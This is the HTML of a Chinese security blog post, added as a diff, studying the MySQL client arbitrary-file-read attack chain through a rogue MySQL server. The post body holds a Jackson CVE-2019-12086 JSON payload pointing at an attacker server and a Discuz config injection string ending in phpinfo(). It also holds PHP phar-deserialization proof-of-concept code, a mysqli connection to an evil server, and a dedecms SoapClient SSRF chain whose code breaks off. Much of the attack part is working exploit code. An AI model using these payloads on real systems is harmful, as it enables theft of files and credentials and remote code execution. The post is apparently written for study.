@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="记忆是相见的一种方式。  关于　https://www.lorexxar.cn/2020/01/14/css-mysql-chain/　的学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql Client 任意文件读取攻击链拓展">
+<meta property="og:url" content="https://lengjibo.github.io/mysqlc/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="记忆是相见的一种方式。  关于　https://www.lorexxar.cn/2020/01/14/css-mysql-chain/　的学习笔记">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zghntxsj30nq0dlq3x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zy8hbaij30j509xjrr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zyuy7ngj30le0bjwfa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb101o9whmj30fd07474a.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb28er05y7j30qi0kjdhh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb28r5apkkj30ka08wgq0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4fr4zs11j31700mbdks.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4h9oosupj30qy0eawkl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4halaqoej30qw0f3n4x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hdyzhffj30uw0773z5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hgbyi93j326m0st7ix.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hh7m2maj31jx15bqck.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hjpf8ihj30pl078wfa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hk9km5vj30rg0er0um.jpg">
+<meta property="og:updated_time" content="2020-01-21T13:35:11.448Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql Client 任意文件读取攻击链拓展">
+<meta name="twitter:description" content="记忆是相见的一种方式。  关于　https://www.lorexxar.cn/2020/01/14/css-mysql-chain/　的学习笔记">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zghntxsj30nq0dlq3x.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/mysqlc/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Mysql Client 任意文件读取攻击链拓展 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Beranda</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Tentang</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategori</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Arsip</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/mysqlc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Mysql Client 任意文件读取攻击链拓展
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Diposting di</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-01-21 21:13:30 / Updated at: 21:35:11" itemprop="dateCreated datePublished" datetime="2020-01-21T21:13:30+08:00">2020-01-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Di</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Ｗeb安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记忆是相见的一种方式。</p>
+<hr>
+<p>关于　<a href="https://www.lorexxar.cn/2020/01/14/css-mysql-chain/" target="_blank" rel="noopener">https://www.lorexxar.cn/2020/01/14/css-mysql-chain/</a>　的学习笔记</p>
+<a id="more"></a>
+<h2 id="Load-data-infile"><a href="#Load-data-infile" class="headerlink" title="Load data infile"></a>Load data infile</h2><p>首先认识一下一个语法：</p>
+<blockquote>
+<p>Load data infile</p>
+</blockquote>
+<p>我们看下mysql手册是如何定义的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA</span><br><span class="line">    [LOW_PRIORITY | CONCURRENT] [LOCAL]</span><br><span class="line">    INFILE &apos;file_name&apos;</span><br><span class="line">    [REPLACE | IGNORE]</span><br><span class="line">    INTO TABLE tbl_name</span><br><span class="line">    [PARTITION (partition_name [, partition_name] ...)]</span><br><span class="line">    [CHARACTER SET charset_name]</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &apos;string&apos;]</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &apos;char&apos;]</span><br><span class="line">        [ESCAPED BY &apos;char&apos;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &apos;string&apos;]</span><br><span class="line">        [TERMINATED BY &apos;string&apos;]</span><br><span class="line">    ]</span><br><span class="line">    [IGNORE number &#123;LINES | ROWS&#125;]</span><br><span class="line">    [(col_name_or_user_var</span><br><span class="line">        [, col_name_or_user_var] ...)]</span><br><span class="line">    [SET col_name=&#123;expr | DEFAULT&#125;,</span><br><span class="line">        [, col_name=&#123;expr | DEFAULT&#125;] ...]</span><br></pre></td></tr></table></figure>
+<p>基本用法（导入文件test.txt到table1表中，txt文件中的行分隔符为\r\n，默认tab键为字段分隔符，txt文件中的每个字段按顺序对应column1、column2，。。。导入表中）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;/test.txt&quot; into table1 lines terminated by &apos;\r\n&apos; (colunm1,colunm2,...)</span><br></pre></td></tr></table></figure>
+<p>如果字段分隔符不是tab，可加入：fields terminated by ‘分隔符’</p>
+<p>知道了该语法的基本用法之后，我们看一下在渗透中的用法，也就是读文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;Ｃ:\2.txt&quot; into table test FIELDS TERMINATED BY &apos;\n&apos;;</span><br></pre></td></tr></table></figure>
+<p>不过需要file权限以及收到 –secure-file-priv的限制。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zghntxsj30nq0dlq3x.jpg" alt="0.png"></p>
+<p>加入local之后就可以了</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zy8hbaij30j509xjrr.jpg" alt="1.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb0zyuy7ngj30le0bjwfa.jpg" alt="2.png"></p>
+<p>说明:MySQl的版本不得低于3.22.15,否则load data local不起作用,以及local_infile参数为on</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb101o9whmj30fd07474a.jpg" alt="3.png"></p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>网上有很多相关的原理我这里就不过多赘述了，然后原理懂得之后，我们其实就可以进行利用了。一张图了解大概的流程;</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb28er05y7j30qi0kjdhh.jpg" alt="4.png"></p>
+<p>然后我这里使用phpstudy的phpmyadmin做演示，嫌麻烦的可以用vulnspy的在线环境，</p>
+<p>需要的是操作步骤：修改phpMyAdmin目录下的 /libraries/config.default.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * allow login to any user entered server in cookie based authentication</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> boolean $cfg[‘AllowArbitraryServer’]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$cfg[‘AllowArbitraryServer’] = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>
+<p>将默认值false修改为true;</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>然后远程启动rogue_mysql_server，在phpmyadmin的登录处填写自己的恶意服务器地址，帐号密码随意，即可获取到读取的文件(在恶意mysql中自行制定)，在本目录下生成mysql.log文件，里面包含读取到的文件内容</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb28r5apkkj30ka08wgq0.jpg" alt="5.png"></p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>下面是一些受影响的范围：</p>
+<p><strong>底层应用</strong></p>
+<table>
+<thead>
+<tr>
+<th>客户端</th>
+<th>是否影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mysql client 1</td>
+<td>pwned</td>
+</tr>
+<tr>
+<td>php mysqli</td>
+<td>pwned，fixed by 7.3.4</td>
+</tr>
+<tr>
+<td>php pdo</td>
+<td>默认禁用</td>
+</tr>
+<tr>
+<td>python MySQLdb</td>
+<td>pwned</td>
+</tr>
+<tr>
+<td>python mysqlclient</td>
+<td>pwned</td>
+</tr>
+<tr>
+<td>java JDBC Driver</td>
+<td>pwned，部分条件下默认禁用</td>
+</tr>
+<tr>
+<td>navicat</td>
+<td>pwned</td>
+</tr>
+</tbody>
+</table>
+<p><strong>探针</strong></p>
+<table>
+<thead>
+<tr>
+<th>探针名称</th>
+<th>是否影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>雅黑PHP探针</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>iprober2 探针</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>PHP探针 for LNMP一键安装包</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>UPUPW PHP 探针</td>
+<td>失败</td>
+</tr>
+</tbody>
+</table>
+<p><strong>云服务商 云数据库 数据迁移服务</strong></p>
+<table>
+<thead>
+<tr>
+<th>服务商</th>
+<th>是否影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>腾讯云 DTS</td>
+<td>失败 禁用Load data local</td>
+</tr>
+<tr>
+<td>阿里云 RDS 数据迁移</td>
+<td>失败 禁用Load data local</td>
+</tr>
+<tr>
+<td>华为云 RDS DRS服务</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>京东云 RDS</td>
+<td>不支持远程迁移功能分布式关系数据库未开放</td>
+</tr>
+<tr>
+<td>UCloud RDS</td>
+<td>不支持远程迁移功能，分布式关系数据库不能对外数据同步</td>
+</tr>
+<tr>
+<td>QiNiu云 RDS</td>
+<td>不支持远程迁移功能</td>
+</tr>
+<tr>
+<td>新睿云 RDS</td>
+<td>不支持远程迁移功能</td>
+</tr>
+<tr>
+<td>网易云 RDS</td>
+<td>外部实例迁移 成功</td>
+</tr>
+<tr>
+<td>金山云 RDS DTS数据迁移</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>青云Cloud RDS</td>
+<td>数据导入 失败，禁用load data local</td>
+</tr>
+<tr>
+<td>百度Cloud RDS</td>
+<td>DTS 成功</td>
+</tr>
+<tr>
+<td>Google could SQL数据库</td>
+<td>迁移失败 禁用Load data infile</td>
+</tr>
+<tr>
+<td>AWS RDS</td>
+<td>DMS服务 成功</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Excel online sql查询</strong></p>
+<table>
+<thead>
+<tr>
+<th>header 1</th>
+<th>header 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WPS</td>
+<td>failed（没找到这个功能）</td>
+</tr>
+<tr>
+<td>Microsoft excel</td>
+<td>failed（禁用了infile语句）</td>
+</tr>
+<tr>
+<td>Google 表格 插件Supermetrics</td>
+<td>pwned</td>
+</tr>
+<tr>
+<td>Advanced CFO Solutions</td>
+<td>MySQL Query failed</td>
+</tr>
+<tr>
+<td>SeekWell</td>
+<td>failed</td>
+</tr>
+<tr>
+<td>Skyvia Query Gallery</td>
+<td>failed</td>
+</tr>
+<tr>
+<td>database Borwser</td>
+<td>failed</td>
+</tr>
+<tr>
+<td>Kloudio</td>
+<td>pwned</td>
+</tr>
+</tbody>
+</table>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="CVE-2019-12086-jackson任意文件读取漏洞"><a href="#CVE-2019-12086-jackson任意文件读取漏洞" class="headerlink" title="CVE-2019-12086 jackson任意文件读取漏洞"></a>CVE-2019-12086 jackson任意文件读取漏洞</h3><p>CVE-2019-12086：在2.9.9之前的FasterXML jackson-databind 2.x中发现了漏洞。在开启Default Typing的情况下，且classpath中存在mysql-connector-java 8.0.15版本（2019.2.1发布）以下，攻击者可以通过发送恶意json数据读取任意文件。mysql-connector-java这个库就是连接数据库时常用的mysql jdbc。这是因为缺少com.mysql.cj.jdbc.admin.MiniAdmin验证。</p>
+<p>其实这个漏洞主要还是Mysql的锅，在com.mysql.cj.jdbc.admin.MiniAdmin的构造函数接受一个string的值，这个值代表jdbcURL，com.mysql.cj.jdbc.admin.MiniAdmin类在初始化会连接这个jdbcURL中指定的MySQL数据库。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql://attacker_server:port/foo&quot;]</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4fr4zs11j31700mbdks.jpg" alt="6.png"></p>
+<h3 id="任意文件读-with-配置文件泄露"><a href="#任意文件读-with-配置文件泄露" class="headerlink" title="任意文件读 with 配置文件泄露"></a>任意文件读 with 配置文件泄露</h3><p>在Discuz x3.4的配置中存在这样两个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config/config_ucenter.php</span><br><span class="line">config/config_global.php</span><br></pre></td></tr></table></figure>
+<p>在dz的后台，有一个ucenter的设置功能，这个功能中提供了ucenter的数据库服务器配置功能，通过配置数据库链接恶意服务器，可以实现任意文件读取获取配置信息。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4h9oosupj30qy0eawkl.jpg" alt="7.png"></p>
+<p>配置ucenter的访问地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原地址： http://localhost:8086/upload/uc_server</span><br><span class="line">修改为： http://localhost:8086/upload/uc_server\&apos;);phpinfo();//</span><br></pre></td></tr></table></figure>
+<p>当我们获得了authkey之后，我们可以通过admin的uid以及盐来计算admin的cookie。然后用admin的cookie以及UC_KEY来访问即可生效</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4halaqoej30qw0f3n4x.jpg" alt="8.png"></p>
+<h3 id="任意文件读-to-反序列化"><a href="#任意文件读-to-反序列化" class="headerlink" title="任意文件读 to 反序列化"></a>任意文件读 to 反序列化</h3><p>2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a> 。</p>
+<p>在该议题中提到，在PHP中存在一个叫做Stream API，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了phar://这个stream wrapper。</p>
+<p>首先需要一个生成一个phar</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pphar.php</span><br><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $s = &apos;&apos;;</span><br><span class="line">    public function __wakeup () &#123;</span><br><span class="line">        echo &quot;pwned!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a &quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new A();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用该文件生成一个phar.phar</p>
+<p>然后我们模拟一次查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">test.php</span><br><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $s = &apos;&apos;;</span><br><span class="line">    public function __wakeup () &#123;</span><br><span class="line">        echo &quot;pwned!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</span><br><span class="line">$s = mysqli_real_connect($m, &apos;&#123;evil_mysql_ip&#125;&apos;, &apos;root&apos;, &apos;123456&apos;, &apos;test&apos;, 3667);</span><br><span class="line">$p = mysqli_query($m, &apos;select 1;&apos;);</span><br><span class="line">// file_get_contents(&apos;phar://./phar.phar&apos;);</span><br></pre></td></tr></table></figure>
+<p>图中我们只做了select 1查询，但我们伪造的evil mysql server中驱使mysql client去做load file local查询，读取了本地的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://./phar.phar</span><br></pre></td></tr></table></figure>
+<p>成功触发反序列化</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hdyzhffj30uw0773z5.jpg" alt="9.png"></p>
+<h3 id="反序列化-to-RCE"><a href="#反序列化-to-RCE" class="headerlink" title="反序列化 to RCE"></a>反序列化 to RCE</h3><p>当一个反序列化漏洞出现的时候，我们就需要从源代码中去寻找合适的pop链，建立在pop链的利用基础上，我们可以进一步的扩大反序列化漏洞的危害。</p>
+<p>php序列化中常见的魔术方法有以下</p>
+<ul>
+<li>当对象被创建的时候调用：__construct</li>
+<li>当对象被销毁的时候调用：__destruct</li>
+<li>当对象被当作一个字符串使用时候调用：__toString</li>
+<li>序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep</li>
+<li>反序列化恢复对象之前就调用此方法：__wakeup</li>
+<li>当调用对象中不存在的方法会自动调用此方法：__call</li>
+<li>配合与之相应的pop链，我们就可以把反序列化转化为RCE。</li>
+</ul>
+<p><strong>dedecms 后台反序列化漏洞 to SSRF</strong></p>
+<p>dedecms 后台，模块管理，安装UCenter模块。开始配置</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hgbyi93j326m0st7ix.jpg" alt="10.png"></p>
+<p>首先需要找一个确定的UCenter服务端，可以通过找一个dz的站来做服务端。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hh7m2maj31jx15bqck.jpg" alt="11.png"></p>
+<p>然后就会触发任意文件读取，当然，如果读取文件为phar，则会触发反序列化。</p>
+<p>我们需要先生成相应的phar</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Control</span><br><span class="line">&#123;</span><br><span class="line">    var $tpl;</span><br><span class="line">    // $a = new SoapClient(null,array(&apos;uri&apos;=&gt;&apos;http://example.com:5555&apos;, &apos;location&apos;=&gt;&apos;http://example.com:5555/aaa&apos;));</span><br><span class="line">    public $dsql;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">		$this-&gt;dsql = new SoapClient(null,array(&apos;uri&apos;=&gt;&apos;http://xxxx:5555&apos;, &apos;location&apos;=&gt;&apos;http://xxxx:5555/aaa&apos;));</span><br><span class="line">	&#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        unset($this-&gt;tpl);</span><br><span class="line">        $this-&gt;dsql-&gt;Close(TRUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;dedecms.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;dedecms.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span 